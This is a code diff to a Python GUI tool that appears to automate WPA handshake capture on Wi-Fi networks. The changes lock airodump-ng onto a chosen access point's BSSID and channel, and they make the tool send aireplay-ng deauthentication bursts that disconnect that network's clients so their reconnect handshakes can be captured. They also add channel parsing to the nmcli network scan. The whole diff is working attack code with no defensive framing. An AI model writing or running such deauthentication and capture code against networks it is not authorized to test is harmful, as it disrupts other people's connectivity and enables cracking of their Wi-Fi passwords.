@@ -255,32 +255,32 @@ class MonitorWindow:
             if not self.running:
                 return
 
-            # Phase 2: airodump-ng is a curses app — log stderr so errors are visible
+            # Phase 2: lock to the target channel so we don't miss the handshake
             cap_path = os.path.join(self.capture_dir, "capture")
-            log_path = os.path.join(self.capture_dir, "airodump.log")
-            self.append_output(f"\nStarting airodump-ng on {self.mon_iface}...\n")
-            self.append_output(f"Log: {log_path}\n")
+            bssid = self.net.get("bssid", "")
+            channel = self.net.get("channel", "")
+            self.append_output(f"\nStarting airodump-ng on {self.mon_iface}"
+                               f"{' ch' + channel if channel else ''}...\n")
 
-            with open(log_path, "w") as log_f:
-                self.process = subprocess.Popen(
-                    ["sudo", "airodump-ng", "-w", cap_path, "--essid", self.essid, self.mon_iface],
-                    stdout=log_f,
-                    stderr=log_f,
-                    preexec_fn=os.setsid,
-                )
+            cmd = ["sudo", "airodump-ng", "-w", cap_path, "--essid", self.essid]
+            if bssid:
+                cmd += ["-b", bssid]
+            if channel:
+                cmd += ["-c", channel]
+            cmd.append(self.mon_iface)
+
+            self.process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid,
+            )
 
             self.append_output("Waiting for WPA handshake...\n")
             self.process.wait()
 
-            # If airodump exited early, show the log
             if self.running:
-                try:
-                    with open(log_path) as log_f:
-                        tail = log_f.read()[-800:]
-                    if tail.strip():
-                        self.append_output(f"\nairodump-ng exited. Log:\n{tail}\n")
-                except Exception:
-                    pass
+                self.append_output("\nairodump-ng exited.\n")
 
         except Exception as e:
             self.append_output(f"\nError: {e}\n")
@@ -299,33 +299,18 @@ class MonitorWindow:
             if self.deauth_process and self.deauth_process.poll() is None:
                 self.deauth_process.terminate()
 
-            cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, self.mon_iface]
+            cmd = ["sudo", "aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
             self.deauth_process = subprocess.Popen(
                 cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
 
-            self.append_output(f"\n>>> Started deauth on {bssid}\n")
-            self.append_output("Watching for reconnect activity...\n\n")
-
-            threading.Thread(target=self._monitor_deauth, daemon=True).start()
+            self.append_output(f"\n>>> Sent deauth burst on {bssid}\n")
+            self.append_output("Watching for reconnect / handshake...\n\n")
 
         except Exception as e:
             self.append_output(f"\nDeauth error: {e}\n")
-
-    def _monitor_deauth(self):
-        try:
-            if self.deauth_process and self.deauth_process.stdout:
-                for line in iter(self.deauth_process.stdout.readline, ''):
-                    if not self.running:
-                        break
-                    # Usually too noisy for small screen; enable if needed:
-                    # self.append_output(line)
-                    pass
-        except Exception:
-            pass
 
     def _poll_for_handshake(self):
         if not self.running:
@@ -528,14 +513,15 @@ class WifiUI:
             if len(line) < 18:
                 continue
             bssid = line[:17]
-            parts = line[18:].split(":", 2)
+            parts = line[18:].split(":", 3)
             ssid = (parts[0] or "<hidden>").strip()
             signal = parts[1].strip() if len(parts) > 1 else "0"
-            security = (parts[2] or "Open").strip() if len(parts) > 2 else "Open"
+            security = parts[2].strip() if len(parts) > 2 else "Open"
+            channel = parts[3].strip() if len(parts) > 3 else ""
             key = (ssid, bssid)
             if key not in seen:
                 seen.add(key)
-                rows.append({"bssid": bssid, "ssid": ssid, "signal": signal, "security": security})
+                rows.append({"bssid": bssid, "ssid": ssid, "signal": signal, "security": security, "channel": channel})
         rows.sort(key=lambda r: int(r["signal"]) if r["signal"].isdigit() else -1, reverse=True)
         return rows
 
@@ -579,7 +565,7 @@ class WifiUI:
         self.root.after(0, lambda: self.set_status("Scanning..."))
 
         self.run_command(["nmcli", "device", "wifi", "rescan", "ifname", WIFI_IFACE])
-        result = self.run_command(["nmcli", "-t", "-e", "no", "-f", "BSSID,SSID,SIGNAL,SECURITY", "device", "wifi", "list", "ifname", WIFI_IFACE])
+        result = self.run_command(["nmcli", "-t", "-e", "no", "-f", "BSSID,SSID,SIGNAL,SECURITY,CHAN", "device", "wifi", "list", "ifname", WIFI_IFACE])
 
         if result.returncode != 0:
             self.root.after(0, lambda: self._scan_failed())
